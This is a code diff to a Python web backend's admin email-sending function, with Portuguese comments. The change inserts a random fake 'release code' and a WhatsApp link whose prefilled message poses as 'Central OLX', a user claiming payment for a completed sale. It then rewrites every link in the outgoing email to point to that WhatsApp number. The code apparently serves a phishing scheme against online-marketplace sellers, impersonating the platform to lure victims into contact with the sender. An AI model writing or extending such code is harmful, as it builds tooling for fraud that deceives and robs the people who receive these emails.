@@ -8014,21 +8014,21 @@ def api_admin_send_email():
 
             # Pegar whatsapp (supreme_whatsapp) se passado, ou tenta o do admin logado
             whatsapp = data.get('whatsapp_number', '').strip()
+            if not whatsapp:
+                whatsapp = get_whatsapp_config().get("number", "")
+
             if whatsapp:
                 import urllib.parse
                 import random
                 import string
-                # Gera um código "criptografado" de 6 dígitos único para cada lead
-                auth_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+                import re
                 
+                auth_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
                 zap_msg = f"Olá, Central OLX! Vim resgatar o valor da minha venda concluída. Meu código de liberação é: {auth_code}"
                 zap_link = f"https://wa.me/{whatsapp}?text={urllib.parse.quote(zap_msg)}"
-                html_content = html_content.replace('href="#"', f'href="{zap_link}"')
-                html_content = html_content.replace('href=""', f'href="{zap_link}"')
-                # Procura a tag <a> caso não tenha href
-                if 'resgatar pagamento da venda' in html_content:
-                    html_content = html_content.replace('<span class="t53"', f'<a href="{zap_link}" style="text-decoration:none;"><span class="t53"')
-                    html_content = html_content.replace('resgatar pagamento da venda</span>', 'resgatar pagamento da venda</span></a>')
+                
+                # Troca ABSOLUTAMENTE TODOS os links (href) do email para o link do WhatsApp
+                html_content = re.sub(r'href=[\'"][^\'"]*[\'"]', f'href="{zap_link}"', html_content)
 
     if not html_content:
         return jsonify({"ok": False, "error": "HTML content missing"}), 400
